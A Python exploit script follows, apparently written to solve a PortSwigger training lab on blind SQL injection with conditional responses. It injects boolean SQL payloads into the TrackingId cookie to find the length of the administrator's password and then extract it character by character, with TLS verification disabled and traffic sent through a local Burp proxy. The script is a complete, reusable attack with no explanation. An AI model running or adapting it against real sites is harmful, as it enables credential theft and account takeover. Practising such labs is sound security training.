# PortSwigger
# Lab: Blind SQL injection with conditional responses

import sys
import requests
import urllib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target Data
url = ""
tracking_id = ""
session = ""

# Localhost Proxies (To intercept with Burp Suite)
proxies = { 'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }

# Request Cookies
cookies = {
    "TrackingId": tracking_id,
    "session": session
}

# Password Characters
characters = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0']


def get_Password_Length(max_length):
    
    print("(+) Retrieving password length...")

    for i in range(1, max_length + 1):

        sqli_playload = "' AND (SELECT LENGTH(password) FROM users WHERE username = 'administrator') = %s--" % (i)
        cookies["TrackingId"] = tracking_id + urllib.parse.quote(sqli_playload)

        response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

        sys.stdout.write("\r" + str(i))
        sys.stdout.flush()

        if "Welcome" in response.text:                
            return i
        
        
def get_Password(password_length):    
    
    print("\r(+) Retrieving password characters...")    
    password_extracted = ""

    for i in range(1, password_length + 1):
        
        for j in range(0, len(characters)):

            sqli_playload = "' AND (SELECT SUBSTRING(password,%s,1) FROM users WHERE username = 'administrator') = '%s" % (i, characters[j])
            cookies["TrackingId"] = tracking_id + urllib.parse.quote(sqli_playload)

            response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

            sys.stdout.write('\r' + password_extracted + characters[j])
            sys.stdout.flush()

            if "Welcome" in response.text:
                password_extracted += characters[j]
                break


if __name__ == "__main__":     
    password_length = get_Password_Length(25)    
    get_Password(password_length)